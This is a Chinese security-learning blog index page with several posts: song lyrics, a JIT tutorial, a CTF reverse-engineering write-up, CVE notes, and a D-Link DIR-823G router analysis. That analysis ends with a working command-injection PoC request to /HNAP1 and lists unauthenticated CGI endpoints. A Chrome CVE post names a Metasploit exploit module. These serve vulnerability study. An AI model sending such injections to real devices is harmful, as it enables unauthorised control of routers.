+<p>如果我有枪我会保护你，也会杀了你，但我把枪丢了，踉踉跄跄的跑到你面前说我害怕</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">Loving strangers ×3</span><br><span class="line"></span><br><span class="line">爱上了陌生人</span><br><span class="line"></span><br><span class="line">Ahah</span><br><span class="line"></span><br><span class="line">Loving strangers ×3</span><br><span class="line"></span><br><span class="line">爱上了陌生人</span><br><span class="line"></span><br><span class="line">Ah</span><br><span class="line"></span><br><span class="line">I’ve got a hole, oh in my pocket</span><br><span class="line"></span><br><span class="line">我口袋破了一个洞</span><br><span class="line"></span><br><span class="line">where all the money has gone</span><br><span class="line"></span><br><span class="line">钱都从那里消失了</span><br><span class="line"></span><br><span class="line">I’ve got a whole lot of work to do with your heart</span><br><span class="line"></span><br><span class="line">我想经常存在于你的心里</span><br><span class="line"></span><br><span class="line">Cuz it’s so busy, mine’s not</span><br><span class="line"></span><br><span class="line">因为你的心很忙，我的心却很悠闲</span><br><span class="line"></span><br><span class="line">Loving strangers ×3</span><br><span class="line"></span><br><span class="line">爱上陌生人</span><br><span class="line"></span><br><span class="line">Ahah</span><br><span class="line"></span><br><span class="line">Loving strangers ×3</span><br><span class="line"></span><br><span class="line">爱上陌生人</span><br><span class="line"></span><br><span class="line">Ah</span><br><span class="line"></span><br><span class="line">It’s just the start of the winter</span><br><span class="line"></span><br><span class="line">那是冬天的开始的季节</span><br><span class="line"></span><br><span class="line">And I’m all alone</span><br><span class="line"></span><br><span class="line">我独自一人</span><br><span class="line"></span><br><span class="line">But I’ve got my eye right on you</span><br><span class="line"></span><br><span class="line">我所有的目光全都在你身上</span><br><span class="line"></span><br><span class="line">Give me a coin</span><br><span class="line"></span><br><span class="line">给我一枚硬币</span><br><span class="line"></span><br><span class="line">And I&#39;ll take you to the moon</span><br><span class="line"></span><br><span class="line">我将带你去往月球</span><br><span class="line"></span><br><span class="line">Now give me a beer</span><br><span class="line"></span><br><span class="line">现在请给我一杯啤酒</span><br><span class="line"></span><br><span class="line">And I’ll kiss you so foolishly</span><br><span class="line"></span><br><span class="line">我将像个呆瓜一样吻你</span><br><span class="line"></span><br><span class="line">like you do when you lie, when you’re not in my thoughts</span><br><span class="line"></span><br><span class="line">你说谎的时候，不会站在我的视角考虑</span><br><span class="line"></span><br><span class="line">like you do when you lie</span><br><span class="line"></span><br><span class="line">当你说谎的时候</span><br><span class="line"></span><br><span class="line">And I know it’s not my imagination</span><br><span class="line"></span><br><span class="line">我知道那不是我的幻想</span><br><span class="line"></span><br><span class="line">Loving strangers ×3</span><br><span class="line"></span><br><span class="line">爱啊，陌生人</span><br><span class="line"></span><br><span class="line">Ahah</span><br><span class="line"></span><br><span class="line">爱啊</span><br><span class="line"></span><br><span class="line">Loving strangers ×3</span><br><span class="line"></span><br><span class="line">爱上一个陌生人</span><br><span class="line"></span><br><span class="line">Ah</span><br><span class="line"></span><br><span class="line">啊哈</span><br><span class="line"></span><br><span class="line">Loving strangers ×3</span><br><span class="line"></span><br><span class="line">爱啊，陌生人</span><br><span class="line"></span><br><span class="line">Nahnahnah</span><br><span class="line"></span><br><span class="line">Loving strangers ×3</span><br><span class="line"></span><br><span class="line">爱上了一个陌生人</span><br><span class="line"></span><br><span class="line">Ahah...</span><br><span class="line"></span><br><span class="line">Ah...</span><br><span class="line"></span><br><span class="line">Ah...</span><br></pre></td></tr></table></figure>
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mood/" rel="tag">mood</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-JIT学习" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/JIT%E5%AD%A6%E4%B9%A0/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.388Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/JIT%E5%AD%A6%E4%B9%A0/">JIT学习</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="JIT原理"><a href="#JIT原理" class="headerlink" title="JIT原理"></a>JIT原理</h2><p>Just In Time编译，也叫运行时编译，不同于C/C++语言直接被翻译成机器指令，javac把java的源文件翻译成了class文件，而class文件中全都是java字节码，那么，JVM在加载了这些class文件以后，针对这些字节码，逐条取出，逐条执行，这种方法就是解释执行。</p>
+<p>还有一种，就是将java字节码重新编译优化，生成机器码，让CPU直接执行，这样编出来的代码效率更高，通常我们不必把所有的java方法都编译成机器码，只需要把调用最频繁，占据CPU时间最长的方法找出来将其编译成机器码，这种调用最频繁的java方法就是我们常说的热点方法。</p>
+<h2 id="技术点"><a href="#技术点" class="headerlink" title="技术点"></a>技术点</h2><p>从大的框架，就是申请一块既有写权限又有执行权限的内存，然后把你要编译的java方法，翻译成机器码，写入到这块内存里，当再需要调用原来的java方法时，就转向调用这块内存。</p>
+<p>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> #include&lt;stdio.h&gt;</span><br><span class="line">int inc(int a) &#123;</span><br><span class="line">    return a + 1;</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">    printf(&quot;%d\n&quot;, inc(3));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>objdump -d 1</code>查看它的机器码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0000000000400526 &lt;inc&gt;:</span><br><span class="line">  400526:	55                   	push   %rbp#保存上一个栈帧的基址，并把当前的栈指针赋给栈基址寄存器</span><br><span class="line">  400527:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">  40052a:	89 7d fc             	mov    %edi,-0x4(%rbp)#把edi存到栈上。在x64处理器上，前6个参数都是使用寄存器传参的。第一个参数会使用rdi，第二个参数使用 rsi，等等。所以 edi 里存的其实就是第一个参数，也就是整数 3</span><br><span class="line">  40052d:	8b 45 fc             	mov    -0x4(%rbp),%eax#把上一步存到栈上的那个整数再存进 eax 中</span><br><span class="line">  400530:	83 c0 01             	add    $0x1,%eax#把 eax 加上 1， 然后就退栈，返回。按照x64的规定（ABI），返回值通过eax传递</span><br><span class="line">  400533:	5d                   	pop    %rbp</span><br><span class="line">  400534:	c3                   	retq</span><br></pre></td></tr></table></figure>
+
+<p>我们发现，第三局第四局好像没有必要，gcc默认情况下生成的机器码有点没必要，它总要把入参放到栈上，但其实我们是可以直接把参数从rdi中放入到rax中的，在运行时修改inc的逻辑即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> #include&lt;stdio.h&gt;</span><br><span class="line"> #include&lt;memory.h&gt;</span><br><span class="line"> #include&lt;sys&#x2F;mman.h&gt;</span><br><span class="line">typedef int (* inc_func)(int a); </span><br><span class="line">int main() &#123;</span><br><span class="line">    char code[] &#x3D; &#123; </span><br><span class="line">        0x55,             &#x2F;&#x2F; push rbp</span><br><span class="line">        0x48, 0x89, 0xe5, &#x2F;&#x2F; mov rsp, rbp</span><br><span class="line">        0x89, 0xf8,       &#x2F;&#x2F; mov edi, eax</span><br><span class="line">        0x83, 0xc0, 0x01, &#x2F;&#x2F; add $1, eax</span><br><span class="line">        0x5d,             &#x2F;&#x2F; pop rbp</span><br><span class="line">        0xc3              &#x2F;&#x2F; ret</span><br><span class="line">    &#125;;  </span><br><span class="line">    void * temp &#x3D; mmap(NULL, sizeof(code), PROT_WRITE | PROT_EXEC,</span><br><span class="line">            MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); </span><br><span class="line">    memcpy(temp, code, sizeof(code));</span><br><span class="line">    inc_func p_inc &#x3D; (inc_func)temp;</span><br><span class="line">    printf(&quot;%d\n&quot;, p_inc(7));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>mmap申请了一块有写权限和执行权限的内存，然后将手写的机器码考进去，使用一个函数指针指向这块内存并调用它，通过这种方式就可以执行这一段手写的机器码了。</p>
+<p>我们通过手写机器码将原来的inc函数代替掉了，在新的例子中，我们使用程序中定义的数据来重新造了一个inc函数，这种在运行过程创建新的函数的方式，就是JIT的核心操作。</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">chrome知识点</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Dlink-Dir-823G路由器漏洞挖掘过程" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.384Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/">Dlink DIR-823G 漏洞挖掘过程</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>固件下载地址： <a href="https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA" target="_blank" rel="noopener">https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA</a> 提取码：1ly1</p>
+<h1 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h1><p><b>D-Link DIR-823G命令注入漏洞：</b></p>
+<p>CVE编号：CVE-2019-15529</p>
+<p>D-Link DIR-823G是中国台湾友讯（D-Link）公司的一款无线路由器。使用1.0.2B05版本固件的D-Link DIR-823G中的HNAP1存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。 </p>
+<h1 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h1><ul>
+<li>binwalk -Me 固件.bin //解开固件</li>
+</ul>
+<p><img src="https://i.loli.net/2020/09/24/p67xmQnKZ83I4Hy.png" alt="捕获.PNG"></p>
+<p>是一个squashfs文件系统，标准linux目录结构。</p>
+<ul>
+<li>cat /etc/init.d/rcS //查看路由器开启的服务。</li>
+</ul>
+<p>发现一个goahead进程。</p>
+<blockquote>
+<p>GoAhead(嵌入式Web服务器)，GoAhead自身实现一个web服务器所需提供的基本功能，提供多种方法供扩展服务器的功能，包括asp过程、goforms过程。用户定制型非常强，可通过goaead的api定义url处理函数和可供asp文件中调用的函数。<br><code>websUrlHandlerDefine(T(&quot;/goform&quot;), NULL, 0, websFormHandler, 0);</code> /goform的请求交给websFormHandler函数处理<br><code>websUrlHandlerDefine(T(&quot;/cgi-bin&quot;), NULL, 0, websCgiHandler, 0);</code> /cgi-bin的请求交给websCgiHandler函数处理。</p>
+</blockquote>
+<h2 id="模拟运行固件"><a href="#模拟运行固件" class="headerlink" title="模拟运行固件"></a>模拟运行固件</h2><p>环境使用工具firmware-ayalysis-toolkit。</p>
+<p>搭建教程：<a href="https://zhuanlan.zhihu.com/p/110806057" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/110806057</a></p>
+<p>运行起来后nmap扫端口，发现开了http服务和dns服务。</p>
+<p>访问<a href="http://192.168.0.1,可看到Dlink登录页面。要求用户做一些设置，不需要密码即可登录。" target="_blank" rel="noopener">http://192.168.0.1,可看到Dlink登录页面。要求用户做一些设置，不需要密码即可登录。</a></p>
+<p><img src="https://i.loli.net/2020/09/24/QizkImP7T8lfOuw.png" alt="捕获.PNG"></p>
+<p>在固件解压的文件下找到名为 web_mtn的文件，应该是web目录。其中cgi-bin目录下存放的cgi文件可以非授权访问，可能造成影响。</p>
+<h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p><b><code>/cgi-bin/ExportSettings.sh</code> 导出配置文件，造成信息泄露。</b></p>
+<p><img src="https://i.loli.net/2020/09/24/Eewn8h6ApNbuyYW.png" alt="捕获.PNG"></p>
+<p><b><code>/cgi-bin/upload_settings.cgi</code> 导入配置文件，可导入恶意篡改后的配置。</b></p>
+<p><img src="https://i.loli.net/2020/09/24/oDs9v3ulnqfLOFd.png" alt="捕获.PNG"></p>
+<p><b><code>/cgi-bin/GetDownLoadSyslog.sh</code> 获取系统部分启动信息<code>/var/log/messages*</code></b></p>
+<p><img src="https://i.loli.net/2020/09/24/uqGwiQNa2eHz3CB.png" alt="捕获.PNG"></p>
+<p><b><code>/cgi-bin/upload_firmware.cgi</code> 上传更新固件，可恶意修改固件</b></p>
+<h2 id="goahead-自定义的请求处理函数"><a href="#goahead-自定义的请求处理函数" class="headerlink" title="goahead 自定义的请求处理函数"></a>goahead 自定义的请求处理函数</h2><blockquote>
+<p>处理函数的参数列表：<br>int websCgiHandler(webs_t wp, char_t <em>urlPrefix, char_t *webDir, int arg, char_t *url, char_t *path, char_t</em> query)<br>goForms过程:它主要用来响应用户输入以更新系统设置或者执行特定的动作。在GoAhead中，goForms实现为一个URL处理器，它会解释以”/goform”开始的URLs。紧跟着”goform”之后的字符串定义了表单名字和用户请求的细节.</p>
+</blockquote>
+<p>IDA打开goahead分析：</p>
+<p>通过字符串/cgi-bin或/goform找到定义url的函数位置。交叉引用，发现注册处理函数位置为0x42424C.</p>
+<p><img src="https://i.loli.net/2020/09/24/awysHvo6RAzcgI7.png" alt="捕获.PNG"></p>
+<p>websUrlHandlerDefine 的第一个参数为 url, 第四个参数应该就是相应 url 的处理函数。</p>
+<p>抓取登录数据包，发现往/HNAP1发送。</p>
+<p><img src="https://i.loli.net/2020/09/24/ARI7bVkUMSxZuDJ.png" alt="捕获.PNG"></p>
+<p>分析/HNAP1（0x42383C）处理函数逻辑:</p>
+<p><img src="https://i.loli.net/2020/09/24/EHM2wAsrvhCTJdj.png" alt="捕获.PNG"></p>
+<p>从 wp 结构体中取出此次请求需要调用的函数名，然后去全局函数表里面搜索，找到之后在进行处理。</p>
+<p>找到需要调用的处理函数后，会首先记录POST原始报文。这里记录日志首先是用snprintf生成命令，然后system执行。</p>
+<p><img src="https://i.loli.net/2020/09/24/XD2TKt8ClQEZ6Af.png" alt="捕获.PNG"></p>
+<p>此处可以直接注入’来命令执行。</p>
+<blockquote>
+<p>在PHP中常用到以下几个函数来执行外部命令:<br>system</p>
+<blockquote>
+<p>system()函数能够将字符串作为OS命令执行，并自带输出到当前页面的功能</p>
+</blockquote>
+<p>exec<br>passthru<br>shell_exec</p>
+</blockquote>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;HNAP1&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.0.1</span><br><span class="line">Content-Length: 53</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;69.0.3497.100 Safari&#x2F;537.36</span><br><span class="line">Content-Type: text&#x2F;xml; charset&#x3D;UTF-8</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">SOAPAction: &quot;http:&#x2F;&#x2F;purenetworks.com&#x2F;HNAP1&#x2F;Login&quot;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Connection: close</span><br><span class="line">&#39;&#96;echo hacked_by_hac425!!!!!!!! &gt; &#x2F;web_mtn&#x2F;hack.txt&#96;&#39;</span><br></pre></td></tr></table></figure>
+
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IOT/" rel="tag">IOT</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-DDCTF2019re" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/DDCTF2019re/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.381Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/DDCTF2019re/">DDCTF RE windows_re2</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>esp定律脱壳Aspack，然后ida分析一波。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">int sub_401320()</span><br><span class="line">&#123;</span><br><span class="line">  char v1; &#x2F;&#x2F; [esp+8h] [ebp-C04h]</span><br><span class="line">  char v2; &#x2F;&#x2F; [esp+9h] [ebp-C03h]</span><br><span class="line">  char v3; &#x2F;&#x2F; [esp+408h] [ebp-804h]</span><br><span class="line">  char v4; &#x2F;&#x2F; [esp+409h] [ebp-803h]</span><br><span class="line">  char v5; &#x2F;&#x2F; [esp+808h] [ebp-404h]</span><br><span class="line">  char v6; &#x2F;&#x2F; [esp+809h] [ebp-403h]</span><br><span class="line">  v3 &#x3D; 0;</span><br><span class="line">  sub_401C6A(&amp;v4, 0, 0x3FF);</span><br><span class="line">  v5 &#x3D; 0;</span><br><span class="line">  sub_401C6A(&amp;v6, 0, 0x3FF);</span><br><span class="line">  MEMORY[0x785520C1](&quot;input code:&quot;);</span><br><span class="line">  MEMORY[0x785526D4](&quot;%s&quot;, &amp;v3);</span><br><span class="line">  if ( !(unsigned __int8)sub_4011F0() )</span><br><span class="line">  &#123;</span><br><span class="line">    MEMORY[0x785520C1](&quot;invalid input\n&quot;);</span><br><span class="line">    MEMORY[0x78542455](0);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401240(&amp;v5);</span><br><span class="line">  v1 &#x3D; 0;</span><br><span class="line">  sub_401C6A(&amp;v2, 0, 0x3FF);</span><br><span class="line">  MEMORY[0x78552E73](&amp;v1, &quot;DDCTF&#123;%s&#125;&quot;, &amp;v5);</span><br><span class="line">  if ( !strcmp(&amp;v1, &quot;DDCTF&#123;reverse+&#125;&quot;) )</span><br><span class="line">    MEMORY[0x785520C1](&quot;You&#39;ve got it !!! %s\n&quot;, &amp;v1);</span><br><span class="line">  else</span><br><span class="line">    MEMORY[0x785520C1](&quot;Something wrong. Try again...\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>限制输入0-9,A-F,可想到十六进制</li>
+<li>输入字符经过变换与“DDCTF{reverse+}”对比，相同则成功。</li>
+</ul>
+<p>先尝试输入字符串<code>1234567AAA</code>,得到加密后字符 <code>EjRWeqo=</code>,看着像base664,直接base64转成十六进制尝试，发现得到了我输入字符串。<br>将<code>reverse+</code>转换得到flag</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RE/" rel="tag">RE</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-CVE-2020-6418" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/CVE-2020-6418/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.377Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/CVE-2020-6418/">CVE-2020-6418</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>(资料来自绿盟科技)</p>
+<p>2020年2月24日，google针对桌面版chrome浏览器发布更新以解决多个漏洞，包括已被发现的在野利用的高危漏洞CVE-2020-6418.</p>
+<p>CVE-2020-6418存在于V8中的类型混淆漏洞，V8是chrome的开源JavaScript和WebAssembly引擎，该洞由Google威胁分析小组的Clement Lecigne发现并上报。</p>
+<p>受影响产品版本：</p>
+<p>Google Chrome Version&lt;80.0.3987.122</p>
+<p>适用于windows,Mac,Linux.</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.nsfocus.net/cve-2020-6418" target="_blank" rel="noopener">http://blog.nsfocus.net/cve-2020-6418</a></p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome%E8%B0%83%E8%AF%95/" rel="tag">chrome调试</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-CVE-2019-5786" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/CVE-2019-5786/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.308Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/CVE-2019-5786/">CVE-2019-5786</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>前言：</p>
+<p>这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kali<br>win7_x86<br>Google_chrome_(32bit)_v72.0.3626.119</p>
+<p>浏览下载链接推荐：<a href="https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe" target="_blank" rel="noopener">https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe</a></p>
+<h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>kali启动msf,搜索chrome_filereader利用模块。(据谷歌官方公示，CVE-2019-5786是位于FileReader中的UAF漏洞)</p>
+<p><code>root@kali:~# msfconsole -q</code></p>
+<p><code>msf5 &gt; search chrome_filereader</code></p>
+<blockquote>
+<p>注：<br>1.<code>msfconsole -q</code>  是指启动工具msf，-q 不打印没用的东西出来（msf启动界面）之后可能需要专门整理一下有关msf工具的知识。<br>2.<code>search chrome_filereader</code>正则匹配搜索exp。exp存在则浮现。<br>3.什么是UAF漏洞：内存破坏漏洞，通常存在于浏览器中，详细可见博客文章“UAF漏洞简单学习”</p>
+</blockquote>
+<p>出现exp: <code>exploit/filereader/browser/chrome_filereader_uaf</code></p>
+<p><img src="https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png" alt="捕获.PNG"></p>
+<h3 id="简单了解FileReader对象的用法"><a href="#简单了解FileReader对象的用法" class="headerlink" title="简单了解FileReader对象的用法"></a>简单了解FileReader对象的用法</h3><p>Filereader 可以实现对文件内容或者缓冲区数（Blob）的异步读取</p>
+<ul>
+<li><p>readyState：表示读取状态</p>
+<ul>
+<li>empty,0,尚未读取</li>
+<li>loading,1,正在读取</li>
+<li>done,2,读取完成</li>
+</ul>
+</li>
+<li><p>result：表示读取结果，具体格式与读取方式有关：</p>
+<ul>
+<li>readAsArrayBuffer</li>
+<li>readAsBinaryString</li>
+<li>readAsDataURL</li>
+<li>readAsText</li>
+</ul>
+</li>
+<li><p>onprogress：回调函数</p>
+<ul>
+<li>读取Blob触发</li>
+<li>当数据较多时会周期性触发多次</li>
+</ul>
+</li>
+<li><p>onloadend：回调函数</p>
+<ul>
+<li>读取操作完成时触发，不论读取成功或失败</li>
+</ul>
+</li>
+</ul>
+<p>查看模块信息</p>
